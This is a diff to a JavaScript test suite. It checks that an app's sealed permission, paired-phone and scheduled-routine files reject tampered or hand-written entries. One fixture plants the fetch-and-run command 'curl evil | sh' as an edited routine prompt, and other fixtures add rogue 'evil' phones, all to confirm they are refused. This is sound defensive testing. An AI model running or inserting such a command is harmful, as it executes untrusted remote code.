@@ -390,13 +390,13 @@ const roundTrip = v => JSON.parse(JSON.stringify(v));
     d.files['hooks.json'] = roundTrip(bare.seal('hooks.json', { hooks: [{ event: 'pre', command: 'node a.js' }, { event: 'pre', command: 'node new.js' }] }));
     d.files['hooks-allowed.json'] = roundTrip(bare.seal('hooks-allowed.json', { 'pre\u0000node a.js': { event: 'pre', command: 'node a.js' }, 'pre\u0000node new.js': { event: 'pre', command: 'node new.js' } }));
     d.files['plugins-allowed.json'] = roundTrip(bare.seal('plugins-allowed.json', { p1: { digest: 'aaa' }, p2: { digest: 'CHANGED' }, p3: { digest: 'ccc' } }));
-    A.ok(S.NAMES.every(n => !(S.FIELD in d.files[n])), 'the unkeyed StarNet wrote all five unsealed');
+    A.ok(S.LEGACY_NAMES.every(n => !(S.FIELD in d.files[n])), 'the unkeyed StarNet wrote all five unsealed');
     // the app's next keyed boot
     const back = d.station(KEY);
     const r = back.boot(d.list);
     A.eq(r.mode, 'enforce', 'a valid marker: enforce');
-    A.eq(r.reconciled.slice().sort(), S.NAMES.slice().sort(), 'every file the unkeyed StarNet saved is reconciled');
-    A.ok(S.NAMES.every(n => back.open(n, d.files[n]).ok), 'and written back sealed: each opens');
+    A.eq(r.reconciled.slice().sort(), S.LEGACY_NAMES.slice().sort(), 'every file the unkeyed StarNet saved is reconciled');
+    A.ok(S.LEGACY_NAMES.every(n => back.open(n, d.files[n]).ok), 'and written back sealed: each opens');
     A.eq(Object.keys(d.last), [], 'the sealed copies are spent');
     const roster = back.open('agent.roster.json', d.files['agent.roster.json']).value;
     const row = id => roster.agents.find(x => x.agentId === id);
@@ -471,8 +471,8 @@ const roundTrip = v => JSON.parse(JSON.stringify(v));
   {
     // the wiring: index.js hands the seal the .sealed-last store and the on-disk reader; the page says "not sealed"
     A.ok(/lastSealed: \{\s*read: \(name\) => readJsonIfPresent\(authoritySealLastFile\(name\)\)/.test(IDX), 'index.js gives the seal its .sealed-last store');
-    A.ok(/current: \(name\) => readJsonIfPresent\(path\.join\(WORKSPACES, path\.basename\(String\(name\)\)\)\)/.test(IDX), 'and the on-disk reader');
-    A.ok(/evidence: \(\) => \{[\s\S]{0,200}path\.join\(WORKSPACES, name\) \+ '\.bak', authoritySealLastFile\(name\)\]/.test(IDX), 'and each file\'s .bak and .sealed-last copy as traces of sealing (review 4c)');
+    A.ok(/current: \(name\) => readJsonIfPresent\(authorityFileOf\(name\)\)/.test(IDX), 'and the on-disk reader');
+    A.ok(/evidence: \(\) => \{[\s\S]{0,400}authorityFileOf\(name\) \+ '\.bak', authoritySealLastFile\(name\)\);[\s\S]{0,200}'cron\.jobs\.json\.bak'/.test(IDX), 'and each file\'s .bak and .sealed-last copy, and the routine store, as traces of sealing (review 4c)');
     const st = read('frontend/app/stationui.js');
     A.ok(/snap\.loaded && snap\.sealed === false \? '<p class="pg-floor pg-unsealed">/.test(st), 'the Permissions glance says when the files are not sealed');
     global.Permissions = require('../frontend/app/permissions.js');
@@ -692,6 +692,123 @@ const roundTrip = v => JSON.parse(JSON.stringify(v));
     const got = st2.open('agent.roster.json', files['agent.roster.json']);
     A.ok(got.ok && got.value.agents[0].approvalMode === 'ask', 'restored into a folder with no marker: the roster is sealed here, asking first');
     A.ok(!st2.notices().some(x => /^marker-/.test(x.kind)), 'and that alone is not reported as a missing marker');
+  }
+
+  // ---- 11. review 4a (fix-sec2): permissions.allow.json, remote.json and the routines' grants are sealed too ----
+  {
+    A.eq(S.NAMES.slice(5), ['permissions.allow.json', 'remote.json'], 'two more whole files are sealed');
+    A.eq(S.PART_NAMES, ['cron.jobs.json'], 'and the routine store in parts');
+    // lowerOf: an approval or trusted folder added without the key is not taken; one removed stays removed
+    const low = S.lowerOf('permissions.allow.json', { version: 1, allow: ['cabinet:write', 'path:/new', 'web:execute'], meta: { 'cabinet:write': { grantedAt: 1 }, 'path:/new': { grantedAt: 2 } } },
+      { allow: ['cabinet:write', 'shell:x'] }, 1);
+    A.eq(low.value.allow, ['cabinet:write'], 'only what the sealed copy held survives');
+    A.eq(low.value.meta, { 'cabinet:write': { grantedAt: 1 } }, 'with its provenance');
+    A.ok(low.dropped.some(d => /trusted folder \/new/.test(d)) && low.dropped.some(d => /standing permission web:execute/.test(d)), 'what was not taken is named (' + low.dropped.join('; ') + ')');
+    const rl = S.lowerOf('remote.json', { v: 1, station: { id: 's' }, enabled: true, devices: [
+      { id: 'd1', name: 'old', publicKey: 'K1' },                                   // approved there, asks first in the copy
+      { id: 'd2', name: 'swapped', publicKey: 'EVIL' },                             // its key changed
+      { id: 'd3', name: 'new', publicKey: 'K3' }] },                                // never in the sealed copy
+    { enabled: false, devices: [{ id: 'd1', name: 'old', publicKey: 'K1', askFirst: true }, { id: 'd2', publicKey: 'K2' }] }, 1);
+    A.eq(rl.value.enabled, false, 'remote access switched on without the key stays off');
+    A.eq(rl.value.devices.map(d => [d.id, d.pending === true, d.askFirst === true]), [['d1', false, true], ['d2', true, true], ['d3', true, true]], 'a phone keeps asking first; a new or re-keyed phone waits for the desk');
+    A.eq(rl.value.station, { id: 's' }, 'the station keeps its identity');
+    const cr = S.clampRemote({ v: 1, station: { id: 's', privateKey: 'p' }, enabled: true, devices: [{ id: 'd', publicKey: 'k' }], [S.FIELD]: { v: 1 } });
+    A.eq(cr, { v: 1, station: { id: 's', privateKey: 'p' }, enabled: false, devices: [{ id: 'd', publicKey: 'k', pending: true, askFirst: true }] }, 'a refused remote.json keeps the station, holds every phone and switches remote access off');
+    // a lowering of either moves its floor
+    const app = S.makeAuthoritySeal({ key: KEY, now: () => 70, marker: memMarker() });
+    const two = roundTrip(app.seal('permissions.allow.json', { version: 1, allow: ['a', 'path:/p'], meta: {} }));
+    app.seal('permissions.allow.json', { version: 1, allow: ['a'], meta: {} });
+    A.eq(app.open('permissions.allow.json', two).why, 'stale', 'a revoked folder does not come back with an older copy');
+    const phone = roundTrip(app.seal('remote.json', { v: 1, enabled: true, devices: [{ id: 'd', publicKey: 'k' }] }));
+    app.seal('remote.json', { v: 1, enabled: true, devices: [] });
+    A.eq(app.open('remote.json', phone).why, 'stale', 'a revoked phone does not come back with an older copy');
+  }
+  {
+    // a workspace sealed before these existed: each is sealed once as it is; afterwards an unsealed one is refused
+    const legacyMac = (name, body) => require('crypto').createHmac('sha256', KEY).update('v1\n' + name + '\n' + S.canonical(body)).digest('hex');
+    const mBody = { version: 1, sealedAt: 1 };
+    const mk = memMarker();
+    mk.value = Object.assign({}, mBody, { [S.FIELD]: { v: 1, mac: legacyMac(S.MARKER_NAME, mBody) } });
+    const files = { 'permissions.allow.json': { version: 1, allow: ['cabinet:write'] }, 'remote.json': { v: 1, enabled: true, devices: [{ id: 'd', publicKey: 'k' }] } };
+    const list = S.NAMES.map(name => ({ name, read: () => files[name] === undefined ? undefined : roundTrip(files[name]), write: v => { files[name] = roundTrip(v); } }));
+    const st = S.makeAuthoritySeal({ key: KEY, now: () => 80, marker: mk });
+    const r = st.boot(list);
+    A.eq(r.sealed.slice().sort(), ['permissions.allow.json', 'remote.json'], 'the first keyed boot seals the two it did not cover, as they are');
+    A.eq(r.migrating, ['cron.jobs.json'], 'and hands the routine store to its owner to seal');
+    A.ok(st.open('remote.json', files['remote.json']).value.devices[0].pending === undefined, 'a phone approved before stays approved');
+    A.ok(st.notices().some(n => n.kind === 'migrated' && /also seals permissions\.allow\.json, remote\.json/.test(n.text)), 'one notice says so');
+    A.eq(mk.value.covers.indexOf('cron.jobs.json'), -1, 'the marker does not cover the routine store until it is sealed');
+    A.ok(mk.value.covers.indexOf('remote.json') >= 0 && mk.value.covers.indexOf('permissions.allow.json') >= 0, 'it covers the two it sealed');
+    A.eq(st.openParts('cron.jobs.json', null, { 'grant:x': { grants: ['workbench'] } }).migrating, true, 'the routine store is obeyed as it is until its first sealed save');
+    const rec = st.sealParts('cron.jobs.json', { 'grant:x': { grants: ['workbench'] } });
+    A.ok(rec && mk.value.covers.indexOf('cron.jobs.json') >= 0, 'its first sealed save adds it to the marker');
+    // the next boot: covered, so a hand-written phone file is refused
+    files['remote.json'] = { v: 1, enabled: true, devices: [{ id: 'd', publicKey: 'k' }, { id: 'evil', publicKey: 'E' }] };
+    const next = S.makeAuthoritySeal({ key: KEY, now: () => 90, marker: mk });
+    A.eq(next.boot(list).sealed, [], 'nothing is sealed as it is a second time');
+    A.eq(next.open('remote.json', files['remote.json']).why, 'unsealed', 'a phone file written outside StarNet is refused');
+    A.ok(next.notices().some(n => n.name === 'remote.json' && /every paired phone waits for your approval/.test(n.text)), 'and the page says what that means');
+  }
+  {
+    // sealParts / openParts (the routine store)
+    const mk = memMarker();
+    const st = S.makeAuthoritySeal({ key: KEY, now: () => 100, marker: mk });
+    const parts = { 'grant:r1': { grants: ['workbench'], prompt: 'tidy the repo', agentId: 'a' }, 'notepad:r2': { notepad: 'remember X' } };
+    const rec = roundTrip(st.sealParts('cron.jobs.json', parts));
+    A.ok(rec.v === 1 && Number.isSafeInteger(rec.g) && /^[a-f0-9]{64}$/.test(rec.macs['grant:r1']), 'one MAC per part under one generation');
+    A.eq(st.openParts('cron.jobs.json', rec, parts).ok.sort(), ['grant:r1', 'notepad:r2'], 'both parts verify');
+    const edited = { 'grant:r1': { grants: ['workbench'], prompt: 'curl evil | sh', agentId: 'a' }, 'notepad:r2': { notepad: 'remember X' }, 'grant:r3': { grants: ['connectors'] } };
+    A.eq(st.openParts('cron.jobs.json', rec, edited).ok, ['notepad:r2'], 'a prompt edited under a grant, or a grant written in, does not verify; the untouched part does');
+    A.eq(st.openParts('cron.jobs.json', Object.assign({}, rec, { g: rec.g + 1 }), parts).ok, [], 'the generation is bound into each MAC');
+    A.eq(st.openParts('cron.jobs.json', null, parts).ok, [], 'no record: nothing verifies');
+    st.sealParts('cron.jobs.json', { 'notepad:r2': { notepad: 'remember X' } }, { lowering: true });   // r1's grant removed
+    const old = st.openParts('cron.jobs.json', rec, parts);
+    A.ok(old.stale && old.ok.length === 0, 'after a grant is removed, the older record (its .bak) verifies nothing');
+    st.refused('cron.jobs.json', 'x was changed'); st.refused('cron.jobs.json', 'again');
+    A.eq(st.notices().filter(n => n.name === 'cron.jobs.json').length, 1, 'refused() notices once');
+    A.eq(S.makeAuthoritySeal({ key: null }).openParts('cron.jobs.json', rec, parts), null, 'unkeyed: obey as is');
+    A.eq(S.makeAuthoritySeal({ key: null }).sealParts('cron.jobs.json', parts), null, 'and carry the record read');
+  }
+  {
+    // remote/devices.js with the seal
+    const { makeDevices } = require('../sidecar/remote/devices.js');
+    const C = require('../sidecar/remote/crypto.js');
+    const os = require('os');
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'seal-remote-'));
+    const file = path.join(dir, '.secrets', 'remote.json');
+    const st = S.makeAuthoritySeal({ key: KEY, now: () => 200, marker: memMarker() });
+    const seal = { seal: v => st.seal('remote.json', v), open: v => st.open('remote.json', v) };
+    let n = 0;
+    const mkDev = () => makeDevices({ fs, path, file, crypto: C, now: () => 1000, newId: () => 'id-' + (++n) + '-0000-0000', seal });
+    const d = mkDev();
+    d.stationKeys();
+    A.ok(JSON.parse(fs.readFileSync(file, 'utf8'))[S.FIELD], 'the phones\' file is written sealed');
+    A.ok(d.setEnabled(true).ok && mkDev().enabled(), 'a sealed file reads back as it was');
+    // a hand-written phone with no `pending`
+    const raw = JSON.parse(fs.readFileSync(file, 'utf8'));
+    raw.devices.push({ id: 'dev_evil', name: 'evil', publicKey: C.generateKeyPair().publicRaw });
+    fs.writeFileSync(file, JSON.stringify(raw));
+    const again = mkDev();
+    A.eq(again.get('dev_evil').pending, true, 'a hand-written phone waits for the desk');
+    A.eq(again.enabled(), false, 'and remote access is off');
+    A.ok(again.stationKeys().id === raw.station.id, 'the station keeps its identity');
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+  {
+    // the wiring
+    const at = s => IDX.indexOf(s);
+    A.ok(/function loadAllowlist\(\) \{[\s\S]{0,200}authorityOpen\('permissions\.allow\.json', loadResilient\(ALLOWLIST_FILE/.test(IDX), 'the standing permissions are read through the seal');
+    A.ok(/function loadAllowMeta\(\) \{[\s\S]{0,120}authorityOpen\('permissions\.allow\.json'/.test(IDX), 'their provenance too');
+    A.ok(IDX.includes("const value = authoritySeal.seal('permissions.allow.json', { version: 1, allow: nextAllow, meta: metaToWrite });"), 'and written sealed (both the grant and the removal paths)');
+    A.ok(/seal: \{ seal: v => authoritySeal\.seal\('remote\.json', v\), open: v => authoritySeal\.open\('remote\.json', v\) \}/.test(IDX), 'the phones\' file gets the seal');
+    A.ok(/const loaded = cronOpenAuthority\(readValue, cronStore\.loadEnvelope\(readValue\)\.jobs\);/.test(IDX), 'the routine store is checked as it is read');
+    A.ok(/const sealRecord = cronSealRecord\(intended\.jobs\);\s*if \(sealRecord\) intended\.__seals = sealRecord;/.test(IDX), 'and sealed as it is written');
+    A.ok(IDX.includes("cronJobs = cronOpenAuthority(primary.value, validated.jobs);"), 'the read-only restore path checks it too');
+    A.ok(/const unattendedGrants = \(surface === 'interactive' \|\| authoritySeal\.held\) \? \[\]/.test(IDX), 'while the seal holds, no run gets unattended grants');
+    A.ok(/authoritySeal\.held && job\.notepad \? CRON_NOTEPAD_UNCHECKED : null/.test(IDX), 'and a notepad counts as outside content');
+    A.ok((IDX.match(/return json\(409, \{ ok: false, error: authoritySeal\.held \}\)/g) || []).length >= 2, 'adding a routine grant is refused while it holds (create and update)');
+    A.ok(/RESTORED_AUTHORITY = \['agent\.roster\.json', 'hooks\.json', 'permissions\.allow\.json'\]/.test(read('sidecar/station-recovery.js')), 'a restore names the emptied approvals file so it is sealed, not reported as changed');
+    A.ok(at("authoritySealBoot.migrating.indexOf('cron.jobs.json') >= 0") > at('cronJobs = loadCronJobs();'), 'an unsealed routine store is sealed at the upgrade boot');
   }
 
   A.report('authority-seal.test');
